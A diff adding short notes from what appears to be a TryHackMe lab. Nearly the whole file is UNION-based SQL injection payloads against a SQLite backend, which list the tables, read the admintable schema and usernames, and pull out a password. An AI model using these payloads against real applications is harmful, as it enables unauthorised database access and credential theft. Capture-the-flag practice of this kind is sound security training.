@@ -1,0 +1,20 @@
+
+smokey' Union Select name FROM sqlite_master WHERE type='table';
+
+From above query, we found admintable. Username LIKE is defult in sqlite
+
+smokey' Union Select username FROM admintable WHERE username LIKE ''
+
+Now, we need to determine the column names in admin table
+smokey' Union Select sql FROM sqlite_master WHERE name='admintable
+
+Now find username in admintable. % is wild card in sqlite
+smokey' Union Select username FROM admintable WHERE username LIKE '%
+
+Find passsword for username other than adminusername which is TryhackMeAdmin
+
+smokey' Union Select password FROM admintable WHERE username != '{adminusername}
+smokey' Union Select password FROM admintable WHERE username != 'TryHackMeAdmin
+
+
+
